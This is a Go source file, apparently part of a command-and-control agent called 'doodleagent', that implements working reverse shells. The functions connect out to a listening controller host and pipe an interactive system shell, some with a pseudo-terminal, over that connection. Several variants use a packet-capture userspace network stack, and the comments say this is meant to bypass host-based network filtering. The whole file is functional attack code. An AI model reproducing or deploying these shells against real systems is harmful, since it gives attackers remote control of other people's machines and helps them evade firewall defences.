// Contains logic for a reverse shell
package executor

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/pcapnet"
	"github.com/creack/pty"
)

// OpenReverseShell opens an OS agnostic reverse shell to a listening host
func OpenReverseShell(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	cmd := exec.Command(getShell(), getShellInteractiveArgs()...)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	return nil
}

// OpenReverseShellPty opens an OS agnostic reverse shell to a listening host
// Spawns a pty. More risk--if pty is killed, so is doodleagent
func OpenReverseShellPty(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	cmd := exec.Command(getShell(), getShellInteractiveArgs()...)

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	// Connection -> PTY (stdin)
	go func() {
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Connection (stdout + stderr)
	_, _ = io.Copy(conn, ptmx)

	return cmd.Wait()
}

// runPcapShell owns stdin copying so process exit does not wait for network EOF.
func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("opening shell stdin: %w", err)
	}
	defer stdin.Close()
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("starting shell: %w", err)
	}
	inputDone := make(chan struct{})
	go func() {
		defer close(inputDone)
		defer stdin.Close()
		_, _ = io.Copy(stdin, conn)
	}()
	shellErr := cmd.Wait()
	// Keep capture and injection running until the controller observes FIN and
	// closes its side. Bound the wait if the peer does not respond.
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		select {
		case <-inputDone:
		case <-time.After(2 * time.Second):
		}
	}
	return shellErr
}

// OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
// This uses the pcapconn implementation of net.Conn
// This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	targetIP := msg.SrcIP
	targetPort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
	}
	sourceIP := msg.DstIP
	sourcePort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
	}

	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
	if err != nil {
		return err
	}

	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid -peer: %w", err)
	}

	// Dial via UDP to the server
	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
	if err != nil {
		return err
	}
	defer func() {
		if vstack != nil {
			vstack.Close()
			resultErr = errors.Join(resultErr, vstack.Err())
		}
	}()

	// Dial TCP stack
	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
	if err != nil {
		return err
	}
	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()

	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
		return err
	}

	if err := conn.SetDeadline(time.Time{}); err != nil {
		return err
	}

	// FIXED: Removed the dangerous asynchronous conn.Close() goroutine entirely.
	// We pass 'ctx' into the modified run function below to safely interrupt the execution pipeline.
	return runPcapShellContext(ctx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
}

// FIXED: Context-aware shell runner that cleanly interrupts on Ctrl+C
func runPcapShellContext(ctx context.Context, cmd *exec.Cmd, conn net.Conn) error {
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("opening shell stdin: %w", err)
	}
	defer stdin.Close()
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("starting shell: %w", err)
	}

	inputDone := make(chan struct{})
	go func() {
		defer close(inputDone)
		defer stdin.Close()
		_, _ = io.Copy(stdin, conn)
	}()

	// Watchdog routine: If Ctrl+C happens, kill the underlying binary process cleanly.
	// This naturally cascades down, breaking the io.Copy loop and unblocking cmd.Wait()
	go func() {
		select {
		case <-ctx.Done():
			if cmd.Process != nil {
				_ = cmd.Process.Kill()
			}
		case <-inputDone:
		}
	}()

	shellErr := cmd.Wait()
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		select {
		case <-inputDone:
		case <-time.After(2 * time.Second):
		}
	}
	return shellErr
}

// runPcapShellPty owns stdin copying so process exit does not wait for network EOF.
// Spawns a pty. More risk--if pty is killed, so is doodleagent
func runPcapShellPty(cmd *exec.Cmd, conn net.Conn) error {
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	inputDone := make(chan struct{})
	outputDone := make(chan struct{})

	// Network -> PTY (shell input)
	go func() {
		defer close(inputDone)
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Network (shell output)
	go func() {
		defer close(outputDone)
		_, _ = io.Copy(conn, ptmx)
	}()

	// Wait for the shell to exit.
	shellErr := cmd.Wait()

	// Close the PTY to unblock any pending reads/writes.
	_ = ptmx.Close()

	// Wait for the output forwarding goroutine to finish.
	<-outputDone

	// Signal that no more shell output will be sent.
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
	}

	// Wait briefly for the peer to finish sending input.
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	select {
	case <-inputDone:
	case <-time.After(2 * time.Second):
	}

	return shellErr
}

// OpenPcapReverseShellPty opens an OS agnostic reverse shell to a listening host
// This uses the pcapconn implementation of net.Conn
// This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
// Spawns a pty. More risk--if pty is killed, so is doodleagent
func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	targetIP := msg.SrcIP
	targetPort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
	}
	sourceIP := msg.DstIP
	sourcePort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
	}

	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
	if err != nil {
		return err
	}

	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid -peer: %w", err)
	}

	// Dial via UDP to the server
	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
	if err != nil {
		return err
	}
	// Defer stack cleanup only after successful allocation
	defer func() {
		if vstack != nil {
			vstack.Close()
			resultErr = errors.Join(resultErr, vstack.Err())
		}
	}()

	// Dial TCP stack
	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
	if err != nil {
		return err
	}
	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()

	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
		return err
	}

	// Clear the deadline entirely so interactive sessions don't time out
	if err := conn.SetDeadline(time.Time{}); err != nil {
		return err
	}

	// FIXED: Removed the dangerous asynchronous conn.Close() goroutine entirely.
	// Pass 'ctx' directly down to handle contextual termination safely without virtual stack deadlocks.
	return runPcapShellPtyContext(ctx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
}

func runPcapShellPtyContext(ctx context.Context, cmd *exec.Cmd, conn net.Conn) error {
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	inputDone := make(chan struct{})
	outputDone := make(chan struct{})

	// Network -> PTY (shell input)
	go func() {
		defer close(inputDone)
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Network (shell output)
	go func() {
		defer close(outputDone)
		_, _ = io.Copy(conn, ptmx)
	}()

	// FIXED: Watchdog loop to break out of blocking PTY IO states if Ctrl+C triggers context cancellation
	go func() {
		select {
		case <-ctx.Done():
			if cmd.Process != nil {
				_ = cmd.Process.Kill()
			}
			_ = ptmx.Close() // Force-close the PTY master to shatter blocking reads/writes
		case <-outputDone:
		}
	}()

	// Wait for the shell to exit.
	shellErr := cmd.Wait()

	// Close the PTY to unblock any remaining pending reads/writes.
	_ = ptmx.Close()

	// Wait for the output forwarding goroutine to finish.
	<-outputDone

	// Signal that no more shell output will be sent.
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
	}

	// Wait briefly for the peer to finish sending input.
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	select {
	case <-inputDone:
	case <-time.After(2 * time.Second):
	}

	return shellErr
}
